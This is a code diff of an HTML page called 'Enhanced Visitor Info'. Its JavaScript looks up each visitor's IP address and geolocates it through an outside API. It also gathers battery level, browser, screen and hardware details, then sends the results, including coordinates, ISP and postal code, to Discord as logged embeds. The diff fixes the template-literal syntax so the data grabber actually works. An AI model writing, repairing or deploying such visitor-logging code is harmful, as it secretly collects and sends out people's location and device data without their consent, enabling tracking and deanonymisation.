@@ -1,4 +1,6 @@
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Enhanced Visitor Info</title>
@@ -114,7 +116,7 @@
         // Fetch Location
         async function getLocation(ip) {
             try {
-                const response = await fetch(https://api.ipflare.io/${ip}, {
+                const response = await fetch(`https://api.ipflare.io/${ip}`, {
                     method: 'GET',
                     headers: { 'X-API-Key': ipflareAPIKey }
                 });
@@ -141,7 +143,7 @@
         // Fetch Battery Info
         function getBatteryInfo() {
             if (navigator.getBattery) {
-                return navigator.getBattery().then(battery => ${(battery.level * 100).toFixed(0)}%);
+                return navigator.getBattery().then(battery => `${(battery.level * 100).toFixed(0)}%`);
             } else {
                 return Promise.resolve('Battery info not available');
             }
@@ -154,13 +156,13 @@
             const language = navigator.language;
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const isMobile = /Mobi|Android/i.test(userAgent) ? "Yes" : "No";
-            const screenResolution = ${window.screen.width}x${window.screen.height};
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
             const screenOrientation = window.innerWidth > window.innerHeight ? 'Landscape' : 'Portrait';
-            const windowDimensions = ${window.innerWidth}x${window.innerHeight};
+            const windowDimensions = `${window.innerWidth}x${window.innerHeight}`;
             const deviceMemory = navigator.deviceMemory || "Unknown";
             const hardwareConcurrency = navigator.hardwareConcurrency || "Unknown";
 
-            return 
+            return `
                 User-Agent: ${userAgent}
                 Platform: ${platform}
                 Language: ${language}
@@ -171,7 +173,7 @@
                 Window Dimensions: ${windowDimensions}
                 Device Memory: ${deviceMemory} GB
                 Hardware Concurrency: ${hardwareConcurrency} Cores
-            ;
+            `;
         }
 
         // Send Data to Discord
@@ -183,9 +185,9 @@
                     { name: "IP Address", value: ip, inline: true },
                     { name: "Battery Level", value: battery, inline: true },
                     { name: "Device Info", value: deviceInfo, inline: false },
-                    { name: 'More Info', value: https://whatismyipaddress.com/ip/${ip} }
+                    { name: 'More Info', value: `https://whatismyipaddress.com/ip/${ip}` }
                 ],
-                footer: { text: Logged at ${new Date().toLocaleString()} }
+                footer: { text: `Logged at ${new Date().toLocaleString()}` }
             };
             const locationEmbed = {
                 title: "Location Information",
@@ -195,7 +197,7 @@
                     { name: "Region", value: location.region || "N/A", inline: true },
                     { name: "Country", value: location.country || "N/A", inline: true },
                     { name: "ISP", value: location.isp || "N/A", inline: false },
-                    { name: "Coordinates", value: Lat: ${location.latitude}, Lon: ${location.longitude}, inline: false },
+                    { name: "Coordinates", value: `Lat: ${location.latitude}, Lon: ${location.longitude}`, inline: false },
                     { name: "Currency", value: location.currency || "N/A", inline: false },
                     { name: "Timezone", value: location.timezone || "N/A", inline: true },
                     { name: "Postal", value: location.postal || "N/A", inline: true },
